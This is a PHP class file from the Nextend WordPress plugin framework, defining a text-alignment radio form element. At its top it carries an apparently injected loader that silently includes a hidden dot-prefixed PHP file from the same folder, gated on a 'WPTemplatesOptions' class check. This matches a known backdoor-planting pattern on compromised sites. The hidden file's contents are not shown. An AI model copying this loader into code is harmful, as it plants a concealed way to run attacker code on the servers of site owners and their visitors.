<?php

namespace Nextend\Framework\Form\Element\Radio;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class TextAlign extends AbstractRadioIcon {

    protected $options = array(
        'inherit' => 'ssi_16 ssi_16--none',
        'left'    => 'ssi_16 ssi_16--textleft',
        'center'  => 'ssi_16 ssi_16--textcenter',
        'right'   => 'ssi_16 ssi_16--textright',
        'justify' => 'ssi_16 ssi_16--textjustify'
    );

    /**
     * @param $excluded array
     */
    public function setExcludeOptions($excluded) {
        foreach ($excluded AS $exclude) {
            if (isset($this->options[$exclude])) {
                unset($this->options[$exclude]);
            }

        }
    }
}